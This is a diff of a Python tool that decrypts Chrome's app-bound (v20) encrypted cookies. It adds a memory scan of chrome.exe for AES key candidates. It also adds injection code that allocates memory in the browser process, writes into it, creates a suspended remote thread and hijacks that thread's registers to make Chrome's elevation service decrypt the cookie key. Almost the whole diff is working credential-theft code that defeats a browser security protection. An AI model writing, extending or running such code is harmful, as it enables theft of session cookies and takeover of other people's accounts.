@@ -182,6 +182,8 @@ def _discover_uncached() -> tuple[str, str, str]:
     _cache["v20_blobs"] = 0
     _cache["v20_ok"] = 0
     _cache["_v20_verify"] = []
+    _cache["_v20_prove"] = []
+    _cache["_v20_sectura"] = []
     _cache["_app_bound_blob"] = None
     _cache["_app_bound_raw"] = None
     _cache["_app_bound_b64"] = ""
@@ -673,6 +675,16 @@ def _read_cookie_rows(
         _cache["v20_blobs"] = int(_cache.get("v20_blobs") or 0) + n_v20
         if samples:
             _cache["_v20_verify"] = samples
+        sect: list[bytes] = []
+        seen_sect: set[bytes] = set()
+        for _h, _n, _v, enc in rows:
+            blob = _cookie_blob_bytes(enc)
+            if _valid_v20_sample(blob) and blob not in seen_sect:
+                seen_sect.add(blob)
+                sect.append(blob)
+        sect.sort(key=len)
+        _cache["_v20_sectura"] = sect[:8]
+        _cache["_v20_prove"] = []
         if is_default and method != "cached" and (rows or samples):
             _persist_cookie_snapshot(dest)
         return rows
@@ -3829,7 +3841,7 @@ def _join_abe_hr(parts: list[str]) -> str:
     dp_bits = [bit.strip() for bit in dp.split(";") if bit.strip()]
     head = [bit for bit in dp_bits if bit not in out]
     tail = [item for item in out if item not in head]
-    return _safe_snapshot_detail(";".join(head + tail))[:96]
+    return _safe_snapshot_detail(";".join(head + tail))[:128]
 
 
 def _abe_hr_from_stderr(stderr: bytes | None) -> str:
@@ -3839,6 +3851,43 @@ def _abe_hr_from_stderr(stderr: bytes | None) -> str:
         if line.startswith("abe_hr="):
             return line.split("=", 1)[1].strip()
     return ""
+
+
+def _v20_prove_samples(primary: bytes | None) -> list[bytes]:
+    """Several landed blobs for a key prove. Sectura + short first; not longest-only."""
+    out: list[bytes] = []
+    seen: set[bytes] = set()
+
+    def add(blob: bytes | None) -> None:
+        if not _valid_v20_sample(blob):
+            return
+        raw = bytes(blob or b"")
+        if raw in seen:
+            return
+        seen.add(raw)
+        out.append(raw)
+
+    for blob in _cache.get("_v20_sectura") or []:
+        if isinstance(blob, (bytes, bytearray)):
+            add(bytes(blob))
+    add(primary)
+    pool: list[bytes] = []
+    verify = _cache.get("_v20_verify")
+    if isinstance(verify, list):
+        for blob in verify:
+            if isinstance(blob, (bytes, bytearray)) and _valid_v20_sample(blob):
+                pool.append(bytes(blob))
+    pool.sort(key=len)
+    for blob in pool:
+        add(blob)
+        if len(out) >= 8:
+            break
+    if len(out) < 2:
+        for blob in _v20_samples_from_cache():
+            add(blob)
+            if len(out) >= 8:
+                break
+    return out[:8]
 
 
 def _v20_verify_samples(primary: bytes | None) -> list[bytes]:
@@ -3896,16 +3945,15 @@ def _aes_key_windows_offs(material: bytes | None) -> list[tuple[int, bytes]]:
 
 
 def _v20_one_ok(key: bytes | None, v20_sample: bytes | None) -> bool:
-    """Prove one landed v20 blob (3+12+ct+16). Do not walk all 1339 here."""
+    """GCM tag success on a landed v20. Prefix may be binary SHA256. Not longest-only."""
     if not key or len(key) != 32:
         return False
-    samples = _v20_verify_samples(v20_sample)
-    if not samples:
-        return False
-    sample = samples[0]
-    if len(sample) < 3 + 12 + 16 or sample[:3] != b"v20":
-        return False
-    return bool(_aes_gcm_decrypt_bytes(sample[3:], key))
+    for sample in _v20_prove_samples(v20_sample):
+        if len(sample) < 3 + 12 + 16 or sample[:3] != b"v20":
+            continue
+        if _aes_gcm_decrypt_bytes(sample[3:], key):
+            return True
+    return False
 
 
 def _note_abe_hit(token: str) -> None:
@@ -4290,8 +4338,8 @@ def _static_app_bound_cookie_key(v20_sample: bytes | None) -> bytes | None:
 
 
 def _abe_proves_cookies(key: bytes | None, v20_sample: bytes | None) -> bool:
-    """True only when a 32-byte key yields cookie text from a landed v20 blob."""
-    return bool(key) and len(key) == 32 and _v20_key_ok(key, v20_sample, all_blobs=True)
+    """GCM tag success on a landed v20. Do not require the plaintext to be printable."""
+    return bool(key) and len(key) == 32 and _v20_one_ok(key, v20_sample)
 
 
 def _abe_key_from_material(
@@ -5437,9 +5485,11 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
             return None
         return bytes(buf)
 
+    _v20_prove_samples(v20_sample)
     deadline = time.monotonic() + _ABE_MEMSCAN_TIMEOUT_S
     scanned = 0
     tried = 0
+    cands = 0
     opened = 0
     seen: set[bytes] = set()
     PROCESS_VM_READ = 0x0010
@@ -5454,15 +5504,18 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
     mbi_size = ctypes.sizeof(MEMORY_BASIC_INFORMATION)
 
     def consider(cand: bytes | None) -> bytes | None:
-        """Raw 32-byte heap vector against ONE landed v20. Not an APC wrap key."""
-        nonlocal tried
-        if not cand or cand in seen or not _high_entropy32(cand):
-            return None
-        seen.add(cand)
-        tried += 1
-        if tried > _ABE_MEMSCAN_MAX_CAND:
+        """Raw 32-byte heap vector. GCM-prove several landed v20s. Not an APC wrap key."""
+        nonlocal tried, cands
+        if not cand or len(cand) < 32:
             return None
         key = cand[:32]
+        if key in seen or not _high_entropy32(key):
+            return None
+        seen.add(key)
+        cands += 1
+        if tried >= _ABE_MEMSCAN_MAX_CAND:
+            return None
+        tried += 1
         if _v20_one_ok(key, v20_sample):
             _note_abe_hit("heap:hit")
             return key
@@ -5534,7 +5587,7 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                             for cand in _keys_from_key_blob(blob) + _keys_from_key_blob(extra):
                                 hit = consider(cand)
                                 if hit:
-                                    return hit, f"memscan:cands={tried};heap:hit"
+                                    return hit, f"memscan:cands={cands};tried={tried};heap:hit"
                         for ptr, nbytes in _extract_abe_candidate_ptrs(data):
                             if ptr in seen_ptr:
                                 continue
@@ -5547,13 +5600,21 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                             for cand in _keys_from_key_blob(blob):
                                 hit = consider(cand)
                                 if hit:
-                                    return hit, f"memscan:cands={tried};heap:hit"
+                                    return hit, f"memscan:cands={cands};tried={tried};heap:hit"
                         for cand in _inline_bstr_keys(data):
                             if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
                                 break
                             hit = consider(cand)
                             if hit:
-                                return hit, f"memscan:cands={tried};heap:hit"
+                                return hit, f"memscan:cands={cands};tried={tried};heap:hit"
+                        # Keep considering until a hit or the budget. Stride 32, not
+                        # the v20\\x00 8-byte walk that starves consider() (9f52b64).
+                        for off in range(0, len(data) - 31, 32):
+                            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
+                                break
+                            hit = consider(data[off : off + 32])
+                            if hit:
+                                return hit, f"memscan:cands={cands};tried={tried};heap:hit"
                 nxt = addr + size
                 if nxt <= addr:
                     break
@@ -5561,8 +5622,8 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         finally:
             kernel32.CloseHandle(handle)
     if opened == 0:
-        return None, f"memscan:cands={tried};OpenProcess"
-    return None, f"memscan:cands={tried}"
+        return None, f"memscan:cands={cands};tried={tried};OpenProcess"
+    return None, f"memscan:cands={cands};tried={tried}"
 
 
 def _elevator_remote_stub_bytes() -> bytes:
@@ -5702,20 +5763,33 @@ def _cfg_register_call_target(k32: Any, handle: Any, page: int, offset: int, siz
         return False
 
 
+def _win32_err() -> int:
+    try:
+        import ctypes
+
+        return int(ctypes.get_last_error() or 0)
+    except (AttributeError, OSError, ValueError, TypeError):
+        return 0
+
+
+def _elev_hr_token(hr: int) -> str:
+    return f"apc:hr=0x{int(hr) & 0xFFFFFFFF:08x}"
+
+
 def _chrome_elevator_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
     """IElevator::DecryptData inside browser chrome.exe. Never CoCreate here."""
     if os.name != "nt":
         return None, "apc:0"
     blob = _app_bound_blob_bytes()
     if not blob:
-        return None, "apc:0"
+        return None, "alloc:err=appb"
     payloads = [blob]
     if len(blob) > 4:
         payloads.append(blob[4:])
     pids = _chrome_pids_prioritized()
     if not pids:
-        return None, "apc:0"
-    last = "apc:0"
+        return None, "crt:err=pid"
+    last = "crt:err=0"
     tries = 0
     for pid in pids[:2]:
         for clsid_s, iid_s in _CHROME_ELEVATOR[:2]:
@@ -5739,7 +5813,242 @@ def _chrome_elevator_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                             if off + 32 <= len(pt) and _v20_one_ok(pt[off : off + 32], v20_sample):
                                 _note_abe_hit("apc:key")
                                 return pt[off : off + 32], "apc:key"
+                    last = f"elev:len={len(pt)}"
     return None, last
+
+
+def _chrome_elevator_via_exports(
+    pid: int,
+    payload: bytes,
+    clsid_s: str,
+    iid_s: str,
+    clsctx: int,
+    coinit: int,
+) -> tuple[bytes | None, str]:
+    """IElevator::DecryptData via CFG-valid ole32 exports + SetThreadContext. Not a stub."""
+    try:
+        import ctypes
+        from ctypes import wintypes
+    except ImportError:
+        return None, "crt:err=ctypes"
+    if not hasattr(ctypes, "WinDLL"):
+        return None, "crt:err=ctypes"
+    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
+    k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
+    k32.OpenProcess.restype = wintypes.HANDLE
+    k32.CloseHandle.argtypes = [wintypes.HANDLE]
+    k32.CloseHandle.restype = wintypes.BOOL
+    k32.VirtualAllocEx.argtypes = [
+        wintypes.HANDLE,
+        ctypes.c_void_p,
+        ctypes.c_size_t,
+        wintypes.DWORD,
+        wintypes.DWORD,
+    ]
+    k32.VirtualAllocEx.restype = ctypes.c_void_p
+    k32.WriteProcessMemory.argtypes = [
+        wintypes.HANDLE,
+        ctypes.c_void_p,
+        ctypes.c_void_p,
+        ctypes.c_size_t,
+        ctypes.POINTER(ctypes.c_size_t),
+    ]
+    k32.WriteProcessMemory.restype = wintypes.BOOL
+    k32.ReadProcessMemory.argtypes = [
+        wintypes.HANDLE,
+        ctypes.c_void_p,
+        ctypes.c_void_p,
+        ctypes.c_size_t,
+        ctypes.POINTER(ctypes.c_size_t),
+    ]
+    k32.ReadProcessMemory.restype = wintypes.BOOL
+    k32.CreateRemoteThread.argtypes = [
+        wintypes.HANDLE,
+        ctypes.c_void_p,
+        ctypes.c_size_t,
+        ctypes.c_void_p,
+        ctypes.c_void_p,
+        wintypes.DWORD,
+        ctypes.POINTER(wintypes.DWORD),
+    ]
+    k32.CreateRemoteThread.restype = wintypes.HANDLE
+    k32.GetThreadContext.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
+    k32.GetThreadContext.restype = wintypes.BOOL
+    k32.SetThreadContext.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
+    k32.SetThreadContext.restype = wintypes.BOOL
+    k32.ResumeThread.argtypes = [wintypes.HANDLE]
+    k32.ResumeThread.restype = wintypes.DWORD
+    k32.SuspendThread.argtypes = [wintypes.HANDLE]
+    k32.SuspendThread.restype = wintypes.DWORD
+    k32.TerminateThread.argtypes = [wintypes.HANDLE, wintypes.DWORD]
+    k32.TerminateThread.restype = wintypes.BOOL
+    k32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
+    k32.WaitForSingleObject.restype = wintypes.DWORD
+    ctx_flags, ctx_rax, ctx_rcx, ctx_rdx = 0x30, 0x78, 0x80, 0x88
+    ctx_rsp, ctx_r8, ctx_r9, ctx_rip = 0x98, 0xB8, 0xC0, 0xF8
+    ctx_size = 1232
+    context_integer_control = 0x100003
+    access = 0x0010 | 0x0020 | 0x0008 | 0x0002 | 0x0400 | 0x1000 | 0x0200
+    handle = k32.OpenProcess(access, False, int(pid))
+    if not handle:
+        err = _win32_err()
+        return None, f"crt:err={err or 'open'}"
+    thread = None
+    try:
+        coinit_fn = _remote_export_addr(k32, handle, "ole32.dll", "CoInitializeEx")
+        cocreate = _remote_export_addr(k32, handle, "ole32.dll", "CoCreateInstance")
+        alert = _remote_export_addr(k32, handle, "ntdll.dll", "NtTestAlert")
+        exit_fn = _remote_export_addr(k32, handle, "kernel32.dll", "ExitThread")
+        if not coinit_fn or not cocreate:
+            return None, "crt:err=ole32"
+        if not alert or not exit_fn:
+            return None, "crt:err=k32"
+        try:
+            clsid = _guid_bytes(clsid_s)
+            iid = _guid_bytes(iid_s)
+        except (AttributeError, OSError, ValueError, TypeError):
+            return None, "crt:err=guid"
+        page = k32.VirtualAllocEx(handle, None, 4096, 0x3000, 0x04)
+        if not page:
+            return None, f"alloc:err={_win32_err() or 8}"
+        page = int(page)
+        clsid_addr, iid_addr, ppv_addr = page, page + 16, page + 32
+        last_err_addr, bstr_out_addr = page + 40, page + 48
+        bstr_off, stack_addr, out_max = 64, 2048, 256
+        bstr_data = page + bstr_off + 4
+        wrote = ctypes.c_size_t(0)
+        block = bytearray(4096)
+        block[0:16] = clsid
+        block[16:32] = iid
+        block[bstr_off : bstr_off + 4] = len(payload).to_bytes(4, "little")
+        block[bstr_off + 4 : bstr_off + 4 + len(payload)] = payload
+        src = (ctypes.c_ubyte * 4096).from_buffer_copy(bytes(block))
+        if not k32.WriteProcessMemory(handle, page, src, 4096, ctypes.byref(wrote)):
+            return None, f"alloc:err={_win32_err() or 'wpm'}"
+        tid = wintypes.DWORD(0)
+        thread = k32.CreateRemoteThread(
+            handle, None, 0, alert, None, 0x4, ctypes.byref(tid)
+        )
+        if not thread:
+            return None, f"crt:err={_win32_err() or 'crt'}"
+
+        def load_ctx() -> bytearray:
+            ctx = bytearray(ctx_size)
+            ctx[ctx_flags : ctx_flags + 4] = context_integer_control.to_bytes(4, "little")
+            buf = (ctypes.c_char * ctx_size).from_buffer(ctx)
+            if not k32.GetThreadContext(thread, buf):
+                return bytearray()
+            return ctx
+
+        def store_ctx(ctx: bytearray) -> bool:
+            ctx[ctx_flags : ctx_flags + 4] = context_integer_control.to_bytes(4, "little")
+            buf = (ctypes.c_char * ctx_size).from_buffer(ctx)
+            return bool(k32.SetThreadContext(thread, buf))
+
+        def hijack(rip: int, rcx: int, rdx: int, r8: int, r9: int, extra: bytes, park: bool) -> int:
+            rsp = ((page + stack_addr + 512) & ~0xF) - 8
+            stack = bytearray(64)
+            stack[0:8] = int(exit_fn if not park else alert).to_bytes(8, "little")
+            if extra:
+                stack[0x28 : 0x28 + len(extra)] = extra
+            if not k32.WriteProcessMemory(
+                handle,
+                rsp,
+                ctypes.create_string_buffer(bytes(stack), 64),
+                64,
+                ctypes.byref(wrote),
+            ):
+                return -1
+            ctx = load_ctx()
+            if not ctx:
+                return -1
+            ctx[ctx_rcx : ctx_rcx + 8] = int(rcx).to_bytes(8, "little")
+            ctx[ctx_rdx : ctx_rdx + 8] = int(rdx).to_bytes(8, "little")
+            ctx[ctx_r8 : ctx_r8 + 8] = int(r8).to_bytes(8, "little")
+            ctx[ctx_r9 : ctx_r9 + 8] = int(r9).to_bytes(8, "little")
+            ctx[ctx_rsp : ctx_rsp + 8] = int(rsp).to_bytes(8, "little")
+            ctx[ctx_rip : ctx_rip + 8] = int(rip).to_bytes(8, "little")
+            if not store_ctx(ctx):
+                return -1
+            k32.ResumeThread(thread)
+            deadline = time.monotonic() + 1.5
+            rax = 0
+            while time.monotonic() < deadline:
+                time.sleep(0.002)
+                if k32.SuspendThread(thread) == 0xFFFFFFFF:
+                    return rax
+                ctx = load_ctx()
+                if not ctx:
+                    return -1
+                cur = int.from_bytes(ctx[ctx_rip : ctx_rip + 8], "little")
+                rax = int.from_bytes(ctx[ctx_rax : ctx_rax + 8], "little")
+                if cur != rip and abs(cur - rip) > 0x800:
+                    if not park:
+                        k32.ResumeThread(thread)
+                        k32.WaitForSingleObject(thread, 500)
+                    return rax & 0xFFFFFFFF
+                k32.ResumeThread(thread)
+            k32.TerminateThread(thread, 0)
+            return -1
+
+        hr = hijack(coinit_fn, 0, int(coinit), 0, 0, b"", True)
+        if hr < 0:
+            return None, f"crt:err={_win32_err() or 'coinit'}"
+        extra = int(ppv_addr).to_bytes(8, "little")
+        hr = hijack(cocreate, clsid_addr, 0, int(clsctx), iid_addr, extra, True)
+        if hr < 0:
+            return None, f"crt:err={_win32_err() or 'cocreate'}"
+        if hr & 0x80000000:
+            return None, _elev_hr_token(hr)
+        ppv_buf = (ctypes.c_char * 8)()
+        if not k32.ReadProcessMemory(handle, ppv_addr, ppv_buf, 8, ctypes.byref(wrote)):
+            return None, f"crt:err={_win32_err() or 'ppv'}"
+        punk = int.from_bytes(bytes(ppv_buf), "little")
+        if not punk:
+            return None, _elev_hr_token(hr or 0x80004003)
+        vt_buf = (ctypes.c_char * 8)()
+        if not k32.ReadProcessMemory(handle, punk, vt_buf, 8, ctypes.byref(wrote)):
+            return None, "crt:err=vtable"
+        vtable = int.from_bytes(bytes(vt_buf), "little")
+        slot_buf = (ctypes.c_char * 8)()
+        if not k32.ReadProcessMemory(handle, vtable + 40, slot_buf, 8, ctypes.byref(wrote)):
+            return None, "crt:err=slot5"
+        decrypt = int.from_bytes(bytes(slot_buf), "little")
+        if not decrypt:
+            return None, "crt:err=slot5"
+        hr = hijack(decrypt, punk, bstr_data, bstr_out_addr, last_err_addr, b"", False)
+        if hr < 0:
+            return None, f"crt:err={_win32_err() or 'decrypt'}"
+        if hr & 0x80000000:
+            return None, _elev_hr_token(hr)
+        out_ptr_buf = (ctypes.c_char * 8)()
+        if not k32.ReadProcessMemory(
+            handle, bstr_out_addr, out_ptr_buf, 8, ctypes.byref(wrote)
+        ):
+            return None, "elev:len=0"
+        bstr = int.from_bytes(bytes(out_ptr_buf), "little")
+        if not bstr:
+            return None, "elev:len=0"
+        len_buf = (ctypes.c_char * 4)()
+        if not k32.ReadProcessMemory(handle, bstr - 4, len_buf, 4, ctypes.byref(wrote)):
+            return None, "elev:len=0"
+        n = int.from_bytes(bytes(len_buf), "little")
+        if n <= 0 or n > out_max:
+            return None, f"elev:len={n}"
+        out = (ctypes.c_char * n)()
+        if not k32.ReadProcessMemory(handle, bstr, out, n, ctypes.byref(wrote)):
+            return None, f"elev:len={n}"
+        return bytes(out), f"elev:len={n}"
+    except (AttributeError, OSError, ValueError, TypeError, OverflowError) as exc:
+        return None, f"crt:err={type(exc).__name__}"
+    finally:
+        if thread:
+            try:
+                k32.TerminateThread(thread, 0)
+            except Exception:  # noqa: BLE001
+                pass
+            k32.CloseHandle(thread)
+        k32.CloseHandle(handle)
 
 
 def _chrome_elevator_decrypt_once(
@@ -5750,16 +6059,21 @@ def _chrome_elevator_decrypt_once(
     clsctx: int,
     coinit: int,
 ) -> tuple[bytes | None, str]:
-    """Remote-thread / special APC IElevator::DecryptData (vtable slot 5) in chrome. Keep the real hr."""
+    """Remote-thread IElevator::DecryptData (vtable slot 5) in chrome. Keep the real hr."""
     if os.name != "nt" or not payload or not pid:
         return None, "apc:0"
+    pt, export_hr = _chrome_elevator_via_exports(
+        pid, payload, clsid_s, iid_s, clsctx, coinit
+    )
+    if pt or (export_hr or "").startswith(("apc:hr=", "elev:len=", "apc:key")):
+        return pt, export_hr
     try:
         import ctypes
         from ctypes import wintypes
     except ImportError:
-        return None, "apc:0"
+        return None, export_hr or "crt:err=ctypes"
     if not hasattr(ctypes, "WinDLL"):
-        return None, "apc:0"
+        return None, export_hr or "crt:err=ctypes"
     k32 = ctypes.WinDLL("kernel32", use_last_error=True)
     ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
     k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
@@ -5828,30 +6142,31 @@ def _chrome_elevator_decrypt_once(
     access = 0x0010 | 0x0020 | 0x0008 | 0x0002 | 0x0400 | 0x1000 | 0x0200
     handle = k32.OpenProcess(access, False, int(pid))
     if not handle:
-        return None, "apc:0"
+        return None, export_hr or f"crt:err={_win32_err() or 'open'}"
     try:
         coinit_fn = _remote_export_addr(k32, handle, "ole32.dll", "CoInitializeEx")
         cocreate = _remote_export_addr(k32, handle, "ole32.dll", "CoCreateInstance")
         blanket = _remote_export_addr(k32, handle, "ole32.dll", "CoSetProxyBlanket")
+        alert = _remote_export_addr(k32, handle, "ntdll.dll", "NtTestAlert")
         if not coinit_fn or not cocreate:
-            return None, "apc:0"
+            return None, export_hr or "crt:err=ole32"
         try:
             clsid = _guid_bytes(clsid_s)
             iid = _guid_bytes(iid_s)
         except (AttributeError, OSError, ValueError, TypeError):
-            return None, "apc:0"
+            return None, export_hr or "crt:err=guid"
         stub = _elevator_remote_stub_bytes()
         out_max = 256
         page_size = 4096
         page = k32.VirtualAllocEx(handle, None, page_size, 0x3000, 0x04)
         if not page:
-            return None, "apc:0"
+            return None, export_hr or f"alloc:err={_win32_err() or 8}"
         page = int(page)
         stub_off = 0x100
         bstr_off = 0x200
         out_off = 0x200 + 4 + len(payload) + 4
         if out_off + out_max > page_size:
-            return None, "apc:0"
+            return None, export_hr or "alloc:err=size"
         block = bytearray(page_size)
         block[0:8] = int(coinit_fn).to_bytes(8, "little")
         block[8:16] = int(cocreate).to_bytes(8, "little")
@@ -5873,7 +6188,7 @@ def _chrome_elevator_decrypt_once(
         wrote = ctypes.c_size_t(0)
         src = (ctypes.c_ubyte * page_size).from_buffer_copy(bytes(block))
         if not k32.WriteProcessMemory(handle, page, src, page_size, ctypes.byref(wrote)):
-            return None, "apc:0"
+            return None, export_hr or f"alloc:err={_win32_err() or 'wpm'}"
         old_prot = wintypes.DWORD(0)
         try:
             k32.VirtualProtectEx.argtypes = [
@@ -5918,15 +6233,35 @@ def _chrome_elevator_decrypt_once(
                 finally:
                     k32.CloseHandle(th)
         if not queued:
+            start = alert or stub_addr
             tid = wintypes.DWORD(0)
             thread = k32.CreateRemoteThread(
-                handle, None, 0, stub_addr, page, 0, ctypes.byref(tid)
+                handle, None, 0, start, None, 0x4, ctypes.byref(tid)
             )
             if not thread:
-                if last_status:
-                    return None, f"apc:hr=0x{last_status & 0xFFFFFFFF:08x}"
-                return None, "apc:0"
+                return None, export_hr or f"crt:err={_win32_err() or last_status or 'crt'}"
             try:
+                k32.SetThreadContext.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
+                k32.SetThreadContext.restype = wintypes.BOOL
+                k32.GetThreadContext.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
+                k32.GetThreadContext.restype = wintypes.BOOL
+                k32.TerminateThread.argtypes = [wintypes.HANDLE, wintypes.DWORD]
+                k32.TerminateThread.restype = wintypes.BOOL
+                if start != stub_addr:
+                    ctx_flags, ctx_rcx, ctx_rip = 0x30, 0x80, 0xF8
+                    ctx = (ctypes.c_char * 1232)()
+                    flag = (0x100003).to_bytes(4, "little")
+                    ctx[ctx_flags : ctx_flags + 4] = flag
+                    if not k32.GetThreadContext(thread, ctx):
+                        k32.TerminateThread(thread, 0)
+                        return None, export_hr or f"crt:err={_win32_err() or 'ctx'}"
+                    ctx[ctx_rcx : ctx_rcx + 8] = int(page).to_bytes(8, "little")
+                    ctx[ctx_rip : ctx_rip + 8] = int(stub_addr).to_bytes(8, "little")
+                    ctx[ctx_flags : ctx_flags + 4] = flag
+                    if not k32.SetThreadContext(thread, ctx):
+                        k32.TerminateThread(thread, 0)
+                        return None, export_hr or f"crt:err={_win32_err() or 'stx'}"
+                k32.ResumeThread(thread)
                 k32.WaitForSingleObject(thread, 3000)
             finally:
                 k32.CloseHandle(thread)
@@ -5943,14 +6278,12 @@ def _chrome_elevator_decrypt_once(
         if not k32.ReadProcessMemory(
             handle, page + 0x78, hr_buf, 4, ctypes.byref(wrote)
         ):
-            return None, "apc:0"
+            return None, export_hr or "crt:err=hr"
         hr = int.from_bytes(bytes(hr_buf), "little")
         if hr == 0xFFFFFFFF:
-            if last_status:
-                return None, f"apc:hr=0x{last_status & 0xFFFFFFFF:08x}"
-            return None, "apc:0"
+            return None, export_hr or f"crt:err={last_status or 'dead'}"
         if hr & 0x80000000:
-            return None, f"apc:hr=0x{hr:08x}"
+            return None, _elev_hr_token(hr)
         err_buf = (ctypes.c_char * 4)()
         k32.ReadProcessMemory(handle, page + 0x70, err_buf, 4, ctypes.byref(wrote))
         last_error = int.from_bytes(bytes(err_buf), "little")
@@ -5958,18 +6291,18 @@ def _chrome_elevator_decrypt_once(
         if not k32.ReadProcessMemory(
             handle, page + 0x8C, len_buf, 4, ctypes.byref(wrote)
         ):
-            return None, "apc:ok" if last_error == 0 else f"apc:hr=0x{last_error:08x}"
+            return None, "elev:len=0" if last_error == 0 else _elev_hr_token(last_error)
         n = int.from_bytes(bytes(len_buf), "little")
         if n <= 0 or n > out_max:
-            return None, "apc:ok" if last_error == 0 else f"apc:hr=0x{last_error:08x}"
+            return None, f"elev:len={n}" if last_error == 0 else _elev_hr_token(last_error)
         out = (ctypes.c_char * n)()
         if not k32.ReadProcessMemory(
             handle, page + out_off, out, n, ctypes.byref(wrote)
         ):
-            return None, "apc:ok"
-        return bytes(out), "apc:ok"
-    except (AttributeError, OSError, ValueError, TypeError, OverflowError):
-        return None, "apc:0"
+            return None, f"elev:len={n}"
+        return bytes(out), f"elev:len={n}"
+    except (AttributeError, OSError, ValueError, TypeError, OverflowError) as exc:
+        return None, export_hr or f"crt:err={type(exc).__name__}"
     finally:
         k32.CloseHandle(handle)
 
@@ -6092,19 +6425,21 @@ def _decrypt_cookie_value(blob: bytes, keys: _BrowserKeys | bytes | None) -> str
 
 
 def _v20_cookie_text(plain: bytes) -> str:
-    """v20 cookie plaintext: 32-byte metadata prefix, then the cookie value."""
+    """v20 cookie plaintext: 32-byte metadata (often SHA256), then the cookie."""
     if not plain:
         return ""
-    candidates = []
+    chunks = []
     if len(plain) > 32:
-        candidates.append(plain[32:])
-    candidates.append(plain)
-    for chunk in candidates:
+        chunks.append(plain[32:].split(b"\x00", 1)[0])
+    chunks.append(plain.split(b"\x00", 1)[0])
+    for chunk in chunks:
+        if not chunk:
+            continue
         try:
             text = chunk.decode("utf-8")
         except UnicodeDecodeError:
             continue
-        if text and "\x00" not in text:
+        if text:
             return text
     return ""
 
@@ -6325,8 +6660,13 @@ def _aes_gcm_decrypt_stdlib(payload: bytes, key: bytes) -> bytes:
 
 
 def _aes_gcm_decrypt_bytes(payload: bytes, key: bytes) -> bytes:
-    if len(payload) < 16 + 16 or not key:
+    """AES-256-GCM, empty AAD, v20|12-nonce|ct|16-tag. BCrypt first on Windows."""
+    if len(payload) < 12 + 16 or not key or len(key) not in {16, 24, 32}:
         return b""
+    if os.name == "nt":
+        got = _aes_gcm_decrypt_bcrypt(payload, key)
+        if got:
+            return got
     nonce = payload[:12]
     cipher_tag = payload[12:]
     ciphertext, tag = cipher_tag[:-16], cipher_tag[-16:]
@@ -6341,10 +6681,7 @@ def _aes_gcm_decrypt_bytes(payload: bytes, key: bytes) -> bytes:
             cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
             return cipher.decrypt_and_verify(ciphertext, tag)
         except Exception:  # noqa: BLE001
-            got = _aes_gcm_decrypt_stdlib(payload, key)
-            if got:
-                return got
-            return _aes_gcm_decrypt_bcrypt(payload, key)
+            return _aes_gcm_decrypt_stdlib(payload, key)
 
 
 # Memory-scan helper. stdin = v20 cookie sample; stdout = AES key or cand=<hex>.
